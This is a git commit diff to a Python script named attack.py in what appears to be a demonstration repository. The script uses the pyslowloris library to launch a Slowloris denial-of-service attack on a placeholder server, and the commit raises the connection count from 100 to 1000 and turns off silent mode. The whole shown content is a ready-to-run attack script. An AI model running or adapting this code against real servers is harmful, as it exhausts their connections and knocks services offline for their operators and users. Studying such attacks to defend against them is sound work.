c3ad97e9d2000301db1206ff7b14d13942d19cdb
Mark Veltzer <mark.veltzer@gmail.com>
2024-08-27 20:14:17 +0300

    no commit message given

--- src/slowloris/hacker/attack.py
+++ src/slowloris/hacker/attack.py
@@ -3,7 +3,8 @@
 from pyslowloris import HostAddress, SlowLorisAttack
 
 url = HostAddress.from_url("http://server.com:8080")
-connections_count = 100
+connections_count = 1000
 
-loris = SlowLorisAttack(url, connections_count, silent=True)
+# loris = SlowLorisAttack(url, connections_count, silent=True)
+loris = SlowLorisAttack(url, connections_count)
 loris.start()
